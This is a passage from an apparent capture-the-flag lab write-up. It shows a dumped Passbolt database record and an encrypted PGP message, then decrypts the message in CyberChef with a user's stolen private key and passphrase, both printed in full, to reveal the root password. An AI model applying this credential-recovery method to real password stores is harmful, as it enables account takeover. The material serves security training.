rRVTbQ07Ol8QF9XaEYLEEJGh+vyBOwuZn4dO4+Qe1+PzywK4UCPxgQrH2sCf
OnlP059yoz9rl6BdV4UIXMEk6eG5gZMIQpcmfYMIRSJAp4VDgy60O7A/S2nc
KtLA7wGlxY1IjIWnxOSQyiODuUf+x4BesxCtYjkeKxH084b4Pvpz4+1AD3ys
5NDrwFV9zOA9qgfH5FXPRC5nJh1lZodhxolxscC/PHMvX0gGom7cSYco8bTX
ZwXEv5c+IFKDH4Yr7meeiKNfy+sr2/FqiAnw8SwpJtBPiIJDE8nYAv+eiAHp
3Vnov4eHY7/Qj2bDOYAZiYwSZkgjhmZCwL9UmPtQKGCATQkyhBdhnGWsOICt
42E/vhvF7wCqdTR+NAuYFddUftX78UzrJmlobRR+NGxTUDZgmGtN5XQvuyZi
oQWjMjZX9ivSP23hJdBCaJTHngmwSLlIvquGCY5ep0AeIRxC8FjfdGr9MAU/
72+za0y9yvXuk8gXHsdXNVLxZ2fY7tcqlf4kf6sOW4c/SZSM3VgBJMoM/NnV
Z65hT6OIQ3mI2W/h06/N3qCb+vezh+6WBjUKqdv2+pgHOVzi8DtRO7jHT43T
ZOEYUM9/w+6P9e3zrwiD9Hrx6XWKNY+W5euPp8VwCtkkrKGDdqP6wkYuoWft
GmE96U0Qq2LWDny6QrnPpG/TWNWUX/Zw7vSAr7V9
=s7tx
-----END PGP MESSAGE-----
";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:50:11.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-10-02 21:52:54.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:7:"Secrets";}}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:9:" * _dirty";a:1:{s:7:"secrets";b:1;}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:9:"Resources";}s:12:"showUsername";b:1;s:7:"showUri";b:1;s:15:"showDescription";b:1;s:10:"showSecret";b:1;s:11:"fullBaseUrl";s:25:"https://passbolt.bolt.htb";}s:5:"title";s:43:"Eddie edited the password passbolt.bolt.htb";s:6:"locale";s:5:"en-UK";} | a:1:{s:14:"Auto-Submitted";s:14:"auto-generated";} |    0 |      0 |          4 | 2021-10-02 21:52:54 | 2021-10-02 21:52:54 | 2021-10-02 21:52:54 | a:0:{}      | stream_socket_client(): unable to connect to tcp://localhost:587 (Connection refused) |
...
```

As we can see, we found the following PGP encrypted message from ```eddie@bolt.htb``` :
```console
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQf/UGf6kAGXa6nm9toGx1cQBYVr2fidgiLmYSO7+XhK
NWgw4+N1R3eIra+JCEAxq2LiO7Qvr2nu1OJXoqM9+N379M7AqAsKfNdlpt36
cF+7EKVy90z72S3qzEbKYWC1Ry01j39aeRGw3XLSB3Zf67RQY1V8y80lo4tz
dpS5z+c4j5v+IgIe0WLHtsyev5bmmjp56vWDnjh43w+7TmwcSs8wxa5EbZSE
rRVTbQ07Ol8QF9XaEYLEEJGh+vyBOwuZn4dO4+Qe1+PzywK4UCPxgQrH2sCf
OnlP059yoz9rl6BdV4UIXMEk6eG5gZMIQpcmfYMIRSJAp4VDgy60O7A/S2nc
KtLA7wGlxY1IjIWnxOSQyiODuUf+x4BesxCtYjkeKxH084b4Pvpz4+1AD3ys
5NDrwFV9zOA9qgfH5FXPRC5nJh1lZodhxolxscC/PHMvX0gGom7cSYco8bTX
ZwXEv5c+IFKDH4Yr7meeiKNfy+sr2/FqiAnw8SwpJtBPiIJDE8nYAv+eiAHp
3Vnov4eHY7/Qj2bDOYAZiYwSZkgjhmZCwL9UmPtQKGCATQkyhBdhnGWsOICt
42E/vhvF7wCqdTR+NAuYFddUftX78UzrJmlobRR+NGxTUDZgmGtN5XQvuyZi
oQWjMjZX9ivSP23hJdBCaJTHngmwSLlIvquGCY5ep0AeIRxC8FjfdGr9MAU/
72+za0y9yvXuk8gXHsdXNVLxZ2fY7tcqlf4kf6sOW4c/SZSM3VgBJMoM/NnV
Z65hT6OIQ3mI2W/h06/N3qCb+vezh+6WBjUKqdv2+pgHOVzi8DtRO7jHT43T
ZOEYUM9/w+6P9e3zrwiD9Hrx6XWKNY+W5euPp8VwCtkkrKGDdqP6wkYuoWft
GmE96U0Qq2LWDny6QrnPpG/TWNWUX/Zw7vSAr7V9
=s7tx
-----END PGP MESSAGE-----
```

We have eddie's PGP private key and passphare, Let's decrypt this message using [CyberChef](https://gchq.github.io/CyberChef/#recipe=PGP_Decrypt('-----BEGIN%20PGP%20PRIVATE%20KEY%20BLOCK-----%5CnVersion:%20OpenPGP.js%20v4.10.9%5CnComment:%20https://openpgpjs.org%5Cn%5CnxcMGBGA4G2EBCADbpIGoMv%2BO5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi%5CnfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz%2B5gaYczk%5CncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w%2B8ne0A5I0aygN2OPnEKhU%5CnRNa6PCvADh22J5vD%2B/RjPrmpnHcUuj%2B/qtJrS6PyEhY6jgxmeijYZqGkGeWU%5Cn%2BXkmuFNmq6km9pCw%2BMJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a%5CnIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB%5CnAAH%2BCQMINK%2Be85VtWtjguB8IR%2BAfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW%5CnUjeGmI%2Bw7iQ%2BWYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y%2BFhua%5CnjS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA%5CniOe%2B%2BbiDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac%5Cn2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk%2BZAxd2rJhhleZDiASDrIDT9/G5FDVj%5CnQY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf%5CnDRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j%2Bld8o0YCP%2B76K/%5Cn7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2%5CnAZkM%2B9snQT9azCX/H2kVVryOUmTP%2Buu%2Bp%2Be51z3mxxngp7AE0zHqrahugS49%5CntgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc%5CnUct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP%5CnyF1ROfZJlwFOw4rFnmW4Qtkq%2B1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj%5CnXTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e%5CnIHcUU5wuVGzUXERSBROU5dAOcR%2BlNT%2BBe%2BT6aCeqDxQo37k6kY6Tl1%2B0uvMp%5CneqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t%2Bcl2McqnWJ3EsmZTFi37Lyz1CM%5CnvjdUlrpzWDDCwA8VHN1QxSKv4z2%2BQmXSzR5FZGRpZSBKb2huc29uIDxlZGRp%5CnZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ%5CnAQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9%2BQ0H%5Cn/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN%2Begxf1Yk9/qXF%5CnnyG1k/IImCGf9qmHwHe%2BEvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba%5Cnqx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt%5Cnzc5gVIg7esI2dnTkNnFWoFZ3%2Bj8hzFmS6lJvJ0GN%2BNrd/gAOkhU8P2KcDz74%5Cn7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F%5CnU3vUZKav7ctbWDpJU/ZJ%2B%2BQ/bbQxeFPPkM%2BtZEyAn/fHwwYEYDgbYQEIAJpY%5CnHMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5%5CnzNJUpTZHjTQV%2BHP0J8vPL35IG%2BusXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M%5CnKeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP%5CnrOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx%2BaSX%2BBn8%5CnKo%2BnUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7%5CnXrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP%5CnleD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU%5CnKP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f%5Cna6yNKT1Z649ihWOv%2BvpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo%2Bsu67%5CnJAKMm0cf1opW9x%2BCMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH%5CnkERD10SVfII2e43HFgU%2BwXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99%2B%5CnJa9e91nDa3oLabiqWqKnGPg%2Bky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT%5CnGh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT%2B0eUWkMA5NzJwHbJMVAlB%5CnGquB8QmrJA2QST4v%2B/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW%2Bnqong%5CncVwHHy2W6hVdr1U%2BfXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm%2B3Z1wXO%5Cnn0LJKVoiPuZr/C0gDkek/i%2Bp864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz%5Cn4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT%5Cn4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h%5CnJ6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt%5Cn1VrD5poP49%2BOynR55rXtzi7skOM%2B0o2tcqy3JppM3egvYvXlpzXggC5b1NvS%5CnUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU%5CnNsw%2B14%2BEGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf%5CnQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm%5CnoRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg%5Cn6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/%5CnIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8%5Cn11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw%2B9K0MNARKCm%5CnYZFGLdtA/qMajW4/%2BT3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0%5CnPSwYYWlAywj5%5Cn%3DcqxZ%5Cn-----END%20PGP%20PRIVATE%20KEY%20BLOCK-----','merrychristmas')&input=LS0tLS1CRUdJTiBQR1AgTUVTU0FHRS0tLS0tClZlcnNpb246IE9wZW5QR1AuanMgdjQuMTAuOQpDb21tZW50OiBodHRwczovL29wZW5wZ3Bqcy5vcmcKCndjQk1BL1pjcUhtajEzL2tBUWYvVUdmNmtBR1hhNm5tOXRvR3gxY1FCWVZyMmZpZGdpTG1ZU083K1hoSwpOV2d3NCtOMVIzZUlyYStKQ0VBeHEyTGlPN1F2cjJudTFPSlhvcU05K04zNzlNN0FxQXNLZk5kbHB0MzYKY0YrN0VLVnk5MHo3MlMzcXpFYktZV0MxUnkwMWozOWFlUkd3M1hMU0IzWmY2N1JRWTFWOHk4MGxvNHR6CmRwUzV6K2M0ajV2K0lnSWUwV0xIdHN5ZXY1Ym1tanA1NnZXRG5qaDQzdys3VG13Y1NzOHd4YTVFYlpTRQpyUlZUYlEwN09sOFFGOVhhRVlMRUVKR2grdnlCT3d1Wm40ZE80K1FlMStQenl3SzRVQ1B4Z1FySDJzQ2YKT25sUDA1OXlvejlybDZCZFY0VUlYTUVrNmVHNWdaTUlRcGNtZllNSVJTSkFwNFZEZ3k2ME83QS9TMm5jCkt0TEE3d0dseFkxSWpJV254T1NReWlPRHVVZit4NEJlc3hDdFlqa2VLeEgwODRiNFB2cHo0KzFBRDN5cwo1TkRyd0ZWOXpPQTlxZ2ZINUZYUFJDNW5KaDFsWm9kaHhvbHhzY0MvUEhNdlgwZ0dvbTdjU1ljbzhiVFgKWndYRXY1YytJRktESDRZcjdtZWVpS05meStzcjIvRnFpQW53OFN3cEp0QlBpSUpERThuWUF2K2VpQUhwCjNWbm92NGVIWTcvUWoyYkRPWUFaaVl3U1prZ2pobVpDd0w5VW1QdFFLR0NBVFFreWhCZGhuR1dzT0lDdAo0MkUvdmh2Rjd3Q3FkVFIrTkF1WUZkZFVmdFg3OFV6ckptbG9iUlIrTkd4VFVEWmdtR3RONVhRdnV5WmkKb1FXak1qWlg5aXZTUDIzaEpkQkNhSlRIbmdtd1NMbEl2cXVHQ1k1ZXAwQWVJUnhDOEZqZmRHcjlNQVUvCjcyK3phMHk5eXZYdWs4Z1hIc2RYTlZMeFoyZlk3dGNxbGY0a2Y2c09XNGMvU1pTTTNWZ0JKTW9NL05uVgpaNjVoVDZPSVEzbUkyVy9oMDYvTjNxQ2IrdmV6aCs2V0JqVUtxZHYyK3BnSE9Wemk4RHRSTzdqSFQ0M1QKWk9FWVVNOS93KzZQOWUzenJ3aUQ5SHJ4NlhXS05ZK1c1ZXVQcDhWd0N0a2tyS0dEZHFQNndrWXVvV2Z0CkdtRTk2VTBRcTJMV0RueTZRcm5QcEcvVFdOV1VYL1p3N3ZTQXI3VjkKPXM3dHgKLS0tLS1FTkQgUEdQIE1FU1NBR0UtLS0tLQ):

![cyberchef.JPG](images/cyberchef.JPG)

And we get the message ```{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}``` which contians the root password.
